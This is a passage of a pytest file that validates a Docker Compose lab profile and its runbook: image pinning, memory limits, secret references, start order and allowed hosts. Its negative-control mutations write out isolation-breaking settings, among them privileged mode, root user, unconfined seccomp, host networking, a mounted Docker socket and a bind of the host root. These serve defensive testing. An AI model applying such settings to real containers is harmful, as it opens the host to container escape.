"""Static checks of ``compose.lab-pricing.json``, the optional laboratory profile that runs a local SPACE
(``space-mongo``, ``space-redis``, ``space-api``) and seeds it with the one-shot ``pricing-bootstrap``, and of its runbook ``docs/qa/PRICING_PROFILE.md``, without Docker.

The rules are plain functions of a manifest dict (and the runbook's verified image list) that return a failure
message or None.  The ``control`` tests call them on a conforming in-memory SAMPLE, mutated, so every rule is proven
to refuse what it must; the other tests apply them to the real files.

Run from ``openbinding-gateway`` with its environment::

    uv run --locked pytest ../lab/tests
"""

from __future__ import annotations

import copy
import importlib.util
import json
import re
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]

_spec = importlib.util.spec_from_file_location("lab_compose_rules", HERE / "test_lab_compose.py")
rules = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(rules)

COMPOSE = ROOT / "compose.lab-pricing.json"
RUNBOOK = ROOT / "docs" / "qa" / "PRICING_PROFILE.md"
LONG_RUNNING = ["space-mongo", "space-redis", "space-api"]
SERVICES = [*LONG_RUNNING, "pricing-bootstrap"]
VOLUMES = {"lab-pricing-mongo": "/data/db", "lab-pricing-redis": "/data"}
MAX_MIB = 1152
LIMITS = {"space-mongo": 512, "space-redis": 96, "space-api": 384, "pricing-bootstrap": 96}
# The two images built from the repository: image name and build, each pair exact, never in the verified list.
BUILT = {
    "space-api": ("openbinding-lab/space-api:1.7.1", {"context": "lab/space", "dockerfile": "Dockerfile"}),
    "pricing-bootstrap": ("openbinding-lab/pricing-bootstrap:1", {"context": "lab/tools", "dockerfile": "Dockerfile"}),
}
RETIRED_MARKER = "gap.invalid/space-api:1.7.1"  # the registry-less marker of revision 2, refused everywhere
DIGESTED = re.compile(r"[a-z0-9][a-z0-9./-]*:[A-Za-z0-9._-]+@sha256:[0-9a-f]{64}")
SECRET_REFERENCES = {f"${{DEMO_SPACE_{n}}}" for n in ("JWT_SECRET", "JWT_SALT", "ADMIN_PASSWORD", "MONGO_PASSWORD")}
ALLOWED_SERVICE_KEYS = {"image", "user", "command", "environment", "volumes", "mem_limit", "healthcheck", "depends_on",
                        "build", "restart"}
# Each secret variable of the manifest holds its own reference and no other.
PINNED_REFERENCES = {
    "JWT_SECRET": "JWT_SECRET", "JWT_SALT": "JWT_SALT", "ADMIN_PASSWORD": "ADMIN_PASSWORD",
    "MONGO_INITDB_ROOT_PASSWORD": "MONGO_PASSWORD", "SPACE_ADMIN_PASSWORD": "ADMIN_PASSWORD",
}
PINNED_OWNER = {"MONGO_INITDB_ROOT_PASSWORD": "space-mongo",
                "SPACE_ADMIN_PASSWORD": "pricing-bootstrap"}  # the others belong to space-api
MONGO_PASSWORD_REFERENCE = "${DEMO_SPACE_MONGO_PASSWORD}"
ADMIN_PASSWORD_REFERENCE = "${DEMO_SPACE_ADMIN_PASSWORD}"
ALLOWED_HOSTS = {*LONG_RUNNING, "sphere.score.us.es", "127.0.0.1"}
URL = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://[^\s'\"`<>]*")
# The whole environment of the one-shot: no proxy route, no SPHERE key, the tool's default plan.
BOOTSTRAP_ENV = {
    "SPACE_URL": "http://space-api:3000", "SPACE_ADMIN_USER": "lab-space-admin",
    "SPACE_ADMIN_PASSWORD": ADMIN_PASSWORD_REFERENCE,
}
# The keys and the command are pinned, not the image-dependent values the runbook still lists as unverified.
API_ENV_KEYS = {"NODE_OPTIONS", "MONGO_URI", "REDIS_URL", "JWT_SECRET", "JWT_SALT", "ADMIN_USER", "ADMIN_PASSWORD",
                "SERVER_PORT", "SPHERE_SYNC_ENABLED", "SPHERE_PUBLIC_URL", "SPHERE_API_URL", "SPHERE_ALLOW_LOCAL_HTTP"}
API_HEALTHCHECK = [
    "CMD", "node", "-e",
    "fetch('http://127.0.0.1:3000/api/v1/healthcheck').then(r => process.exit(r.ok ? 0 : 1)).catch(() => process.exit(1))",
]
PINNED_COMMANDS = {
    "space-mongo": ["mongod", "--wiredTigerCacheSizeGB", "0.25"],
    "space-redis": ["redis-server", "--maxmemory", "64mb", "--maxmemory-policy", "noeviction"],
}  # space-api has no command: it runs the image entrypoint
PINNED_DB_HEALTHCHECKS = {
    "space-mongo": ["CMD-SHELL", "mongosh --quiet --eval \"db.adminCommand('ping').ok\""],
    "space-redis": ["CMD", "redis-cli", "ping"],
}
# The only form of MONGO_URI; it is also the only place that may embed the Mongo password reference.
MONGO_URI = "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@space-mongo:27017/space_db?authSource=admin"
SPHERE = {
    "SPHERE_SYNC_ENABLED": "true",
    "SPHERE_PUBLIC_URL": "https://sphere.score.us.es",
    "SPHERE_API_URL": "https://sphere.score.us.es/api/v1",
    "SPHERE_ALLOW_LOCAL_HTTP": "false",
}
MONGO_IMAGE = "mongo:7.0.16@sha256:c630c59342c1493d50345136df2af14a76b9e827dd5316bfabee07a0880a5f3a"
REDIS_IMAGE = "redis:7.4.2@sha256:fbdbaea47b9ae4ecc2082ecdb4e1cea81e32176ffb1dcf643d422ad07427e5d9"
SYNTHETIC_API_IMAGE = "example.invalid/space-api:1.7.1@sha256:" + "ab" * 32  # only for the in-memory controls

# SAMPLE mirrors compose.lab-pricing.json: update it together with the manifest.
SAMPLE = {
    "name": "openbinding-lab-pricing",
    "services": {
        "space-mongo": {
            "image": MONGO_IMAGE, "user": "999:999", "mem_limit": "512m",
            "command": ["mongod", "--wiredTigerCacheSizeGB", "0.25"],
            "environment": {"MONGO_INITDB_ROOT_USERNAME": "space",
                            "MONGO_INITDB_ROOT_PASSWORD": "${DEMO_SPACE_MONGO_PASSWORD}"},
            "volumes": [{"type": "volume", "source": "lab-pricing-mongo", "target": "/data/db"}],
            "healthcheck": {"test": ["CMD-SHELL", "mongosh --quiet --eval \"db.adminCommand('ping').ok\""]},
        },
        "space-redis": {
            "image": REDIS_IMAGE, "user": "999:999", "mem_limit": "96m",
            "command": ["redis-server", "--maxmemory", "64mb", "--maxmemory-policy", "noeviction"],
            "volumes": [{"type": "volume", "source": "lab-pricing-redis", "target": "/data"}],
            "healthcheck": {"test": ["CMD", "redis-cli", "ping"]},
        },
        "space-api": {
            "image": BUILT["space-api"][0], "build": dict(BUILT["space-api"][1]),
            "user": "1000:1000", "mem_limit": "384m",
            "environment": {
                "NODE_OPTIONS": "--max-old-space-size=192",
                "MONGO_URI": "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@space-mongo:27017/space_db?authSource=admin",
                "REDIS_URL": "redis://space-redis:6379",
                "JWT_SECRET": "${DEMO_SPACE_JWT_SECRET}", "JWT_SALT": "${DEMO_SPACE_JWT_SALT}",
                "ADMIN_USER": "lab-space-admin", "ADMIN_PASSWORD": "${DEMO_SPACE_ADMIN_PASSWORD}",
                "SERVER_PORT": "3000", **SPHERE,
            },
            "depends_on": {"space-mongo": {"condition": "service_healthy"},
                           "space-redis": {"condition": "service_healthy"}},
            "healthcheck": {"test": list(API_HEALTHCHECK)},
        },
        "pricing-bootstrap": {
            "image": BUILT["pricing-bootstrap"][0], "build": dict(BUILT["pricing-bootstrap"][1]),
            "user": "1000:1000", "restart": "no", "mem_limit": "96m",
            "environment": dict(BOOTSTRAP_ENV),
            "depends_on": {"space-api": {"condition": "service_healthy"}},
        },
    },
    "volumes": {"lab-pricing-mongo": {"labels": {"profile": "pricing"}}, "lab-pricing-redis": {"labels": {"profile": "pricing"}}},
}
SAMPLE_VERIFIED = [MONGO_IMAGE, REDIS_IMAGE]


def sample() -> dict:
    return copy.deepcopy(SAMPLE)


# -- the rules: manifest in, failure message or None out ------------------------------------------------------------


def rule_optional(manifest: dict) -> str | None:
    if manifest.get("name") != "openbinding-lab-pricing":
        return f"name is {manifest.get('name')!r}"
    if set(manifest.get("services", {})) != set(SERVICES):
        return f"services are {list(manifest.get('services', {}))}"
    if any("profiles" in s for s in manifest["services"].values()) or "profiles" in manifest:
        return "a profiles key makes a service start only on demand"
    return None


def rule_isolated(manifest: dict) -> str | None:
    if not set(manifest) <= {"name", "services", "volumes"}:
        return f"top-level keys {sorted(manifest)}"
    declared = manifest.get("volumes") or {}
    if set(declared) != set(VOLUMES) or any(set(v or {}) - {"labels"} for v in declared.values()):
        return "volumes must be the two named ones, with labels only"
    if any(".sock" in s for s in rules._strings(manifest)):
        return "a socket is mounted"
    for name, service in manifest["services"].items():
        for key in ("ports", "expose", "networks", "network_mode", "tmpfs", *rules.FORBIDDEN_SERVICE_KEYS):
            if key in service:
                return f"{name} uses {key}"
        if set(service) - ALLOWED_SERVICE_KEYS:
            return f"{name} uses keys outside the allow-list: {sorted(set(service) - ALLOWED_SERVICE_KEYS)}"
        if "build" in service and not (
                isinstance(service["build"], dict) and set(service["build"]) == {"context", "dockerfile"}):
            return f"{name}: build must be a mapping of exactly context and dockerfile"
        if "restart" in service and not (name == "pricing-bootstrap" and service["restart"] == "no"):
            return f"{name}: restart is allowed only as \"no\" on pricing-bootstrap"
        ids = str(service.get("user", "0")).split(":")
        if len(ids) != 2 or not all(i.isdigit() and int(i) > 0 for i in ids):
            return f"{name} must run as a numeric non-root user and a numeric non-zero group"
        for mount in service.get("volumes", []):
            if mount.get("type") != "volume" or VOLUMES.get(mount.get("source")) != mount.get("target"):
                return f"{name}: mount {mount} is not one of the named volumes"
    if [n for n in (*manifest["services"], *declared) if not rules.NAME_PATTERN.fullmatch(n)]:
        return "a service or volume name does not match the validator pattern"
    return None


def rule_images(manifest: dict, verified: list[str]) -> str | None:
    for name, service in manifest["services"].items():
        image = service.get("image", "")
        if "gap.invalid" in image:
            return f"{name}: the retired GAP marker {image!r}"
        if "build" in service:
            if name not in BUILT:
                return f"{name}: build is allowed only on {sorted(BUILT)}"
            if (image, service["build"]) != BUILT[name]:
                return f"{name}: image and build must be exactly {BUILT[name]}"
            continue  # a built image has no registry digest to verify
        if not DIGESTED.fullmatch(image):
            return f"{name}: {image!r} is not <repo>:<tag>@sha256:<64 hex>"
        if name == "space-api" and ":1.7.1@" not in image:
            return "space-api must be tag 1.7.1"
        if {"space-mongo": MONGO_IMAGE, "space-redis": REDIS_IMAGE}.get(name, image) != image:
            return f"{name}: {image} is not the verified reference"
        if image not in verified:
            return f"{name}: {image} is not in the runbook's verified list"
    return None


def _mib(value) -> int | None:
    match = re.fullmatch(r"(\d+)([mg])", str(value))
    return int(match.group(1)) * (1024 if match.group(2) == "g" else 1) if match else None


def rule_memory(manifest: dict, documented: int | None) -> str | None:
    services = manifest["services"]
    limits = {name: _mib(s.get("mem_limit")) for name, s in services.items()}
    if None in limits.values():
        return f"mem_limit must be whole m or g units on every service: {limits}"
    total = sum(limits.values())
    if total > MAX_MIB:
        return f"memory sum {total} is above the ceiling {MAX_MIB}"
    if total != documented:
        return f"memory sum {total} differs from the runbook's {documented}"
    if limits != LIMITS:
        return f"mem_limit is {limits}, expected {LIMITS}"
    cache = re.search(r"--wiredTigerCacheSizeGB\s+([\d.]+)", rules._command_text(services["space-mongo"]))
    maxmemory = re.search(r"--maxmemory\s+(\d+)mb", rules._command_text(services["space-redis"]))
    heap = re.search(r"--max-old-space-size=(\d+)", rules._env(services["space-api"]).get("NODE_OPTIONS", ""))
    if not (cache and maxmemory and heap):
        return "cache size, maxmemory or heap cap is missing"
    # The exact values pin each cache below its limit (256 < 512, 64 < 96, 192 < 384), so no inequality is checked.
    if (cache.group(1), maxmemory.group(1), heap.group(1)) != ("0.25", "64", "192"):
        return "cache, maxmemory or heap value differs from 0.25 GB, 64 mb, 192"
    return None


def rule_secrets(manifest: dict, documented: set[str]) -> str | None:
    for text in rules._strings(manifest):
        rest = text
        for reference in SECRET_REFERENCES:
            rest = rest.replace(reference, "")
        if "$" in rest:
            return f"{text!r} has a '$' outside the four bare references"
    if rules.SECRET_SHAPES.search(json.dumps(manifest)):
        return "a secret-shaped literal"
    for name, service in manifest["services"].items():
        env = rules._env(service)
        for key, value in env.items():
            if (rules.SECRET_NAME.search(key) or "SALT" in key) and value not in SECRET_REFERENCES:
                return f"{name}:{key} must be one bare reference of {sorted(SECRET_REFERENCES)}"
            if key in PINNED_REFERENCES and value != f"${{DEMO_SPACE_{PINNED_REFERENCES[key]}}}":
                return f"{name}:{key} holds the wrong reference"
        if re.search(r"requirepass|masterauth", rules._command_text(service), re.IGNORECASE) or rules.SECRET_NAME.search(
                rules._command_text(service)):
            return f"{name}: a credential in the command"
    for key, owner in ((k, PINNED_OWNER.get(k, "space-api")) for k in PINNED_REFERENCES):
        if key not in rules._env(manifest["services"].get(owner, {})):
            return f"{owner}:{key} is missing"
    uri = rules._env(manifest["services"]["space-api"]).get("MONGO_URI", "")
    match = re.match(r"mongodb://[^:/@]+:([^@/]*)@", uri)
    if not match or match.group(1) != MONGO_PASSWORD_REFERENCE:
        return f"MONGO_URI must embed exactly {MONGO_PASSWORD_REFERENCE} as its password"
    if uri != MONGO_URI:
        return f"MONGO_URI must be exactly {MONGO_URI}"
    # The pins above place each reference; the counts rule out a copy anywhere else (a URL query, another variable).
    texts = list(rules._strings(manifest))
    for reference in SECRET_REFERENCES:
        expected = 2 if reference in (MONGO_PASSWORD_REFERENCE, ADMIN_PASSWORD_REFERENCE) else 1
        if sum(t.count(reference) for t in texts) != expected:
            return f"{reference} must appear {expected} time(s) in the manifest"
    missing = {r[2:-1] for r in SECRET_REFERENCES} - documented
    return f"runbook does not document {sorted(missing)}" if missing else None


def rule_start_order(manifest: dict) -> str | None:
    services = manifest["services"]
    for name in LONG_RUNNING:  # the one-shot bootstrap is exempt from the healthcheck rule
        check = services[name].get("healthcheck", {})
        if not check.get("test"):
            return f"{name} has no healthcheck"
        if check["test"][0] == "NONE" or "disable" in check:
            return f"{name} has a disabled healthcheck"
    ready = {"condition": "service_healthy"}
    if services["space-api"].get("depends_on") != {"space-mongo": ready, "space-redis": ready}:
        return "space-api must wait for space-mongo and space-redis with service_healthy only"
    if services.get("pricing-bootstrap", {}).get("depends_on") != {"space-api": ready}:
        return "pricing-bootstrap must wait for space-api alone with service_healthy only"
    return None


def rule_bootstrap_surface(manifest: dict) -> str | None:
    service = manifest["services"].get("pricing-bootstrap")
    if service is None:
        return "pricing-bootstrap is missing"
    env = rules._env(service)
    if env != BOOTSTRAP_ENV:
        return f"pricing-bootstrap environment differs from the pinned one: {sorted(set(env.items()) ^ set(BOOTSTRAP_ENV.items()))}"
    return None


def rule_api_surface(manifest: dict) -> str | None:
    api = manifest["services"]["space-api"]
    env = rules._env(api)
    if set(env) != API_ENV_KEYS:
        return f"space-api environment keys differ: {sorted(set(env) ^ API_ENV_KEYS)}"
    if not re.fullmatch(r"--max-old-space-size=\d+", env["NODE_OPTIONS"]):
        return "NODE_OPTIONS may only set --max-old-space-size"
    if env["REDIS_URL"] != "redis://space-redis:6379":
        return "REDIS_URL must be redis://space-redis:6379, without credentials"
    if api.get("healthcheck", {}).get("test") != API_HEALTHCHECK:
        return "space-api healthcheck command differs from the pinned one"
    if "command" in api or "entrypoint" in api:
        return "space-api must run the image entrypoint, without a command"
    for name, command in PINNED_COMMANDS.items():
        if manifest["services"][name].get("command") != command:
            return f"{name} command differs from the pinned one"
    for name, test in PINNED_DB_HEALTHCHECKS.items():
        if manifest["services"][name].get("healthcheck", {}).get("test") != test:
            return f"{name} healthcheck command differs from the pinned one"
    return None


def _hosts(url: str) -> list[str]:
    """Every host of the URL's authority: userinfo ends at the last '@', a comma separates hosts (multi-host URIs)."""
    authority = re.split(r"[/?#\\]", url.split("://", 1)[1], maxsplit=1)[0].rpartition("@")[2]
    hosts = []
    for item in authority.split(","):
        if item.startswith("["):
            if "]" not in item:
                raise ValueError(f"unterminated IPv6 literal in {url}")
            hosts.append(item[: item.index("]") + 1].lower())
        else:
            hosts.append(item.partition(":")[0].lower())
    return hosts


def rule_remote_sphere(manifest: dict) -> str | None:
    env = rules._env(manifest["services"]["space-api"])
    wrong = {key: env.get(key) for key, value in SPHERE.items() if env.get(key) != value}
    if wrong:
        return f"SPHERE variables differ: {wrong}"
    for text in rules._strings(manifest):
        for url in URL.findall(re.sub(r"[\t\r\n]", "", text)):  # URL parsers drop tabs and newlines
            try:
                hosts = _hosts(url)
            except ValueError:
                return f"unparsable address {url}"
            for host in hosts:
                if host not in ALLOWED_HOSTS:
                    return f"external address {host!r} in {url}"
    return None


# -- the runbook -----------------------------------------------------------------------------------------------------


def section(text: str, heading: str) -> str:
    match = re.search(rf"^## {re.escape(heading)}\s*$(.*?)(?=^## |\Z)", text, re.MULTILINE | re.DOTALL)
    return match.group(1) if match else ""


def verified_images(text: str) -> list[str]:
    body = section(text, "Verified image references")
    return re.findall(r"^- `([^`\s]+@sha256:[0-9a-f]{64})` - verified \d{4}-\d{2}-\d{2}$", body, re.MULTILINE)


def base_digests() -> set[str]:
    """The base-image digests of the two Dockerfiles, read from them."""
    found = set()
    for path in (ROOT / "lab" / "space" / "Dockerfile", ROOT / "lab" / "tools" / "Dockerfile"):
        found |= set(re.findall(r"^FROM\s+\S+@sha256:([0-9a-f]{64})", path.read_text(encoding="utf-8"), re.MULTILINE))
    return found


def rule_runbook(text: str, digests: set[str]) -> str | None:
    if re.search(r"^## GAP\b", text, re.MULTILINE):
        return "the runbook still has a ## GAP section"
    verified = verified_images(text)
    if sorted(verified) != sorted([MONGO_IMAGE, REDIS_IMAGE]):
        return f"the verified list must be exactly the mongo and redis references: {verified}"
    for image, build in BUILT.values():
        # the context counts as a path of its own, not as the tail of the image name (openbinding-lab/space-api)
        context = re.compile(rf"(?<![\w-]){re.escape(build['context'])}(?![\w-])")
        if not any(image in line and context.search(line) for line in text.splitlines()):
            return f"the runbook must name {image} with {build['context']}"
    for digest in sorted(digests):
        if not any(digest in line and "UNVERIFIED" in line for line in text.splitlines()):
            return f"base digest {digest} must be on a line marked UNVERIFIED"
        if any(digest in v for v in verified) or digest in section(text, "Verified image references"):
            return f"base digest {digest} is in the verified list"
    return None


def documented_sum(text: str) -> int | None:
    match = re.search(r"^Memory sum: (\d+) MiB$", text, re.MULTILINE)
    return int(match.group(1)) if match else None


def _manifest() -> dict:
    assert COMPOSE.is_file()
    return json.loads(COMPOSE.read_text(encoding="utf-8"))


def _runbook() -> str:
    assert RUNBOOK.is_file()
    return RUNBOOK.read_text(encoding="utf-8")


# -- the real files ------------------------------------------------------------------------------------------------


def test_optional_profile_file():
    # [utest->req~lab-deployment-pricing-profile-optional~2]
    assert COMPOSE.is_file()
    assert rule_optional(_manifest()) is None


def test_compose_lab_keeps_no_space_service():
    # [utest->req~lab-deployment-pricing-profile-optional~2]
    names = json.loads((ROOT / "compose.lab.json").read_text(encoding="utf-8"))["services"]
    assert not [n for n in names if n.startswith("space") or "space" in n.split("-")]
    assert rules._total_mib(names) == rules.EXPECTED_MIB


def test_pinned_images_match_the_runbook():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    assert RUNBOOK.is_file()
    text = _runbook()
    assert sorted(verified_images(text)) == sorted([MONGO_IMAGE, REDIS_IMAGE]), "the runbook lists other images"
    services = _manifest()["services"]
    assert services["space-mongo"]["image"] == MONGO_IMAGE and services["space-redis"]["image"] == REDIS_IMAGE
    assert rule_images(_manifest(), verified_images(text)) is None


def test_built_images_follow_the_allow_list():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    assert RUNBOOK.is_file()
    services = _manifest()["services"]
    for name, (image, build) in BUILT.items():
        assert name in services, f"{name} is missing"
        assert (services[name].get("image"), services[name].get("build")) == (image, build), name
        assert image not in " ".join(verified_images(_runbook())), "a built image is never verified"
    assert rule_images(_manifest(), verified_images(_runbook())) is None


def test_isolated_services():
    # [utest->req~lab-deployment-pricing-profile-isolated~2]
    assert COMPOSE.is_file()
    assert rule_isolated(_manifest()) is None


def test_memory_budget_matches_the_runbook():
    # [utest->req~lab-deployment-pricing-profile-memory-budget~2]
    assert RUNBOOK.is_file()
    text = _runbook()
    assert documented_sum(text) == 1088, "the runbook must state the sum of 1088 MiB"
    assert rule_memory(_manifest(), documented_sum(text)) is None
    # Scenario (two lab stacks of 4032 MiB plus the profile budget) fits the 9216 MiB host.
    assert 2 * rules.EXPECTED_MIB + 1088 <= 9216


def test_secret_references_are_bare_and_documented():
    # [utest->req~lab-deployment-pricing-profile-secret-references~2]
    assert RUNBOOK.is_file()
    documented = {v for v in (r[2:-1] for r in SECRET_REFERENCES) if f"`{v}`" in _runbook()}
    assert rule_secrets(_manifest(), documented) is None


def test_start_order_waits_for_healthy_databases():
    # [utest->req~lab-deployment-pricing-profile-start-order~2]
    assert COMPOSE.is_file()
    assert rule_start_order(_manifest()) is None


def test_bootstrap_surface_is_pinned():
    # [utest->req~lab-deployment-pricing-profile-bootstrap-environment~1]
    assert COMPOSE.is_file()
    assert rule_bootstrap_surface(_manifest()) is None


def test_remote_sphere_is_the_only_sphere():
    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
    assert COMPOSE.is_file()
    assert rule_remote_sphere(_manifest()) is None


def test_runbook_has_no_gap_and_documents_the_wiring():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    assert RUNBOOK.is_file()
    digests = base_digests()
    assert len(digests) == 3, "the Dockerfiles hold three base-image digests"
    assert rule_runbook(_runbook(), digests) is None


def test_api_surface_is_pinned():
    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
    assert COMPOSE.is_file()
    assert rule_api_surface(_manifest()) is None


# -- controls: the rules on the in-memory SAMPLE ---------------------------------------------------------------------


def _api(manifest: dict) -> dict:
    return manifest["services"]["space-api"]


def _boot(manifest: dict) -> dict:
    return manifest["services"]["pricing-bootstrap"]


DIGESTS = ["11" * 32, "22" * 32, "33" * 32]  # stand-ins for the base-image digests of the Dockerfiles


def _good_runbook() -> str:
    return (
        f"# Runbook\n\n## Verified image references\n\n- `{MONGO_IMAGE}` - verified 2026-10-24\n"
        f"- `{REDIS_IMAGE}` - verified 2026-10-24\n\n## Built images\n\n"
        "- `openbinding-lab/space-api:1.7.1` is built from `lab/space`\n"
        "- `openbinding-lab/pricing-bootstrap:1` is built from `lab/tools`\n"
        + "".join(f"- base `sha256:{d}` UNVERIFIED until the first lab build\n" for d in DIGESTS)
        + "\n## Memory\n\nMemory sum: 1088 MiB\n"
    )


def test_control_sample_conforms():
    # [utest->req~lab-deployment-pricing-profile-optional~2]
    names = {r[2:-1] for r in SECRET_REFERENCES}
    assert rule_optional(sample()) is None and rule_isolated(sample()) is None
    assert rule_images(sample(), SAMPLE_VERIFIED) is None
    assert rule_memory(sample(), 1088) is None and rule_secrets(sample(), names) is None
    assert rule_start_order(sample()) is None and rule_remote_sphere(sample()) is None
    assert rule_api_surface(sample()) is None and rule_bootstrap_surface(sample()) is None
    assert rule_runbook(_good_runbook(), set(DIGESTS)) is None
    digested = sample()
    _api(digested)["image"] = SYNTHETIC_API_IMAGE
    del _api(digested)["build"]
    assert rule_images(digested, [*SAMPLE_VERIFIED, SYNTHETIC_API_IMAGE]) is None


def _env_of(manifest: dict, service: str = "space-api") -> dict:
    return manifest["services"][service]["environment"]


def _profiles(m): m["services"]["space-api"]["profiles"] = ["pricing"]
def _renamed(m): m["name"] = "openbinding-lab"
def _extra(m): m["services"]["space-web"] = {}
def _without_bootstrap(m): del m["services"]["pricing-bootstrap"]
def _bootstrap_renamed(m): m["services"]["space-bootstrap"] = m["services"].pop("pricing-bootstrap")


@pytest.mark.parametrize("mutate", [_profiles, _renamed, _extra, _without_bootstrap, _bootstrap_renamed],
                         ids=lambda f: f.__name__)
def test_control_refuses_a_non_optional_profile(mutate):
    # [utest->req~lab-deployment-pricing-profile-optional~2]
    manifest = sample()
    mutate(manifest)
    assert rule_optional(manifest)


def test_control_ignores_the_service_order():
    # [utest->req~lab-deployment-pricing-profile-optional~2]
    manifest = sample()
    manifest["services"] = dict(reversed(list(manifest["services"].items())))
    assert rule_optional(manifest) is None


def _port(m): _api(m)["ports"] = ["127.0.0.1:3000:3000"]
def _bind(m): _api(m)["volumes"] = [{"type": "bind", "source": "data", "target": "/data"}]
def _root(m): _api(m)["user"] = "0:0"
def _privileged(m): _api(m)["privileged"] = True
def _boot_port(m): _boot(m)["ports"] = ["127.0.0.1:8000:8000"]
def _boot_root(m): _boot(m)["user"] = "0:0"
def _boot_networks(m): _boot(m)["networks"] = ["default"]
def _boot_network_mode(m): _boot(m)["network_mode"] = "host"


@pytest.mark.parametrize("mutate", [_port, _bind, _root, _privileged, _boot_port, _boot_root, _boot_networks,
                                    _boot_network_mode],
                         ids=lambda f: f.__name__)
def test_control_refuses_a_non_isolated_profile(mutate):
    # [utest->req~lab-deployment-pricing-profile-isolated~2]
    manifest = sample()
    mutate(manifest)
    assert rule_isolated(manifest)


def _driver_opts(m): m["volumes"]["lab-pricing-mongo"]["driver_opts"] = {"type": "none", "o": "bind", "device": "/"}
def _networks(m): m["networks"] = {"host": {"external": True}}
def _docker_sock(m): _api(m)["environment"]["DOCKER_HOST"] = "unix:///var/run/docker.sock"
def _gid_zero(m): _api(m)["user"] = "1000:0"
def _gid_name(m): _api(m)["user"] = "1000:root"
def _gid_empty(m): _api(m)["user"] = "1000:"
def _gid_missing(m): _api(m)["user"] = "1000"


@pytest.mark.parametrize("mutate",
                         [_driver_opts, _networks, _docker_sock, _gid_zero, _gid_name, _gid_empty, _gid_missing],
                         ids=lambda f: f.__name__)
def test_control_refuses_bind_networks_socket_and_bad_gid(mutate):
    # [utest->req~lab-deployment-pricing-profile-isolated~2]
    manifest = sample()
    mutate(manifest)
    assert rule_isolated(manifest)


def _security_opt(m): _api(m)["security_opt"] = ["seccomp=unconfined"]
def _userns(m): _api(m)["userns_mode"] = "host"
def _build_args(m): _api(m)["build"]["args"] = {"X": "1"}
def _build_target(m): _api(m)["build"]["target"] = "build"
def _build_string(m): _api(m)["build"] = "lab/space"
def _build_missing_dockerfile(m): del _api(m)["build"]["dockerfile"]
def _boot_cap_drop(m): _boot(m)["cap_drop"] = ["ALL"]
def _boot_read_only(m): _boot(m)["read_only"] = True


@pytest.mark.parametrize("mutate", [_security_opt, _userns, _boot_cap_drop, _boot_read_only],
                         ids=lambda f: f.__name__)
def test_control_refuses_keys_outside_the_allow_list(mutate):
    # [utest->req~lab-deployment-pricing-profile-isolated~2]
    manifest = sample()
    mutate(manifest)
    assert "allow-list" in (rule_isolated(manifest) or "")


@pytest.mark.parametrize("mutate", [_build_args, _build_target, _build_string, _build_missing_dockerfile],
                         ids=lambda f: f.__name__)
def test_control_refuses_extra_build_keys(mutate):
    # [utest->req~lab-deployment-pricing-profile-isolated~2]
    manifest = sample()
    mutate(manifest)
    assert "exactly context and dockerfile" in (rule_isolated(manifest) or "")


@pytest.mark.parametrize("service, value", [("space-api", "no"), ("space-api", "unless-stopped"),
                                            ("space-mongo", "no"), ("pricing-bootstrap", "on-failure"),
                                            ("pricing-bootstrap", "unless-stopped")])
def test_control_refuses_restart_on_another_service_or_value(service, value):
    # [utest->req~lab-deployment-pricing-profile-isolated~2]
    manifest = sample()
    manifest["services"][service]["restart"] = value
    assert "restart" in (rule_isolated(manifest) or "")


def _built(m, name, **changes):
    """Replace the image or build of a built service (a None change deletes the key)."""
    for key, value in changes.items():
        if value is None:
            m["services"][name].pop(key, None)
        else:
            m["services"][name][key] = value


@pytest.mark.parametrize("name, changes", [
    ("space-api", {"build": {"context": "lab/tools", "dockerfile": "Dockerfile"}}),
    ("space-api", {"build": {"context": ".", "dockerfile": "Dockerfile"}}),
    ("pricing-bootstrap", {"build": {"context": "lab/space", "dockerfile": "Dockerfile"}}),
    ("space-api", {"build": {"context": "lab/space", "dockerfile": "other.Dockerfile"}}),
    ("space-api", {"build": {"context": "lab/space", "dockerfile": "Dockerfile", "target": "x"}}),
    ("space-api", {"build": "lab/space"}),
    ("space-api", {"image": "openbinding-lab/space-api:latest"}),
    ("space-api", {"image": "openbinding-lab/space-api:1.8.0"}),
    ("space-api", {"image": None}),
    ("pricing-bootstrap", {"image": "openbinding-lab/pricing-bootstrap:2"}),
    ("space-api", {"image": RETIRED_MARKER}),
    ("space-mongo", {"build": {"context": "lab/space", "dockerfile": "Dockerfile"},
                     "image": "openbinding-lab/space-api:1.7.1"}),
    ("space-redis", {"build": {"context": "lab/space", "dockerfile": "Dockerfile"}}),
])
def test_control_refuses_wrong_builds(name, changes):
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    manifest = sample()
    _built(manifest, name, **changes)
    assert rule_images(manifest, SAMPLE_VERIFIED)


def test_control_accepts_built_images_outside_the_verified_list():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    assert rule_images(sample(), SAMPLE_VERIFIED) is None
    listed = _good_runbook().replace("\n## Built images", f"- `openbinding-lab/space-api:1.7.1@sha256:{'44' * 32}` - verified 2026-10-24\n\n## Built images")
    assert "verified list" in rule_runbook(listed, set(DIGESTS)), "a built image is never verified"


def test_control_refuses_unpinned_images():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    tag_only = sample()
    tag_only["services"]["space-redis"]["image"] = "redis:7.4.2"
    assert rule_images(tag_only, SAMPLE_VERIFIED)
    local_redis = sample()
    local_redis["services"]["space-redis"]["image"] = "openbinding-lab/space-redis:1"
    assert rule_images(local_redis, SAMPLE_VERIFIED)
    missing = sample()
    missing["services"]["space-redis"]["image"] = REDIS_IMAGE
    assert rule_images(missing, [MONGO_IMAGE]), "digest missing from the runbook"
    unlisted = sample()
    _api(unlisted)["image"] = SYNTHETIC_API_IMAGE
    del _api(unlisted)["build"]
    assert rule_images(unlisted, SAMPLE_VERIFIED), "space-api digest missing from the runbook"
    api_tag = sample()
    _api(api_tag)["image"] = "example.invalid/space-api:1.7.1"
    del _api(api_tag)["build"]
    assert rule_images(api_tag, SAMPLE_VERIFIED)
    marker = sample()
    _api(marker)["image"] = RETIRED_MARKER
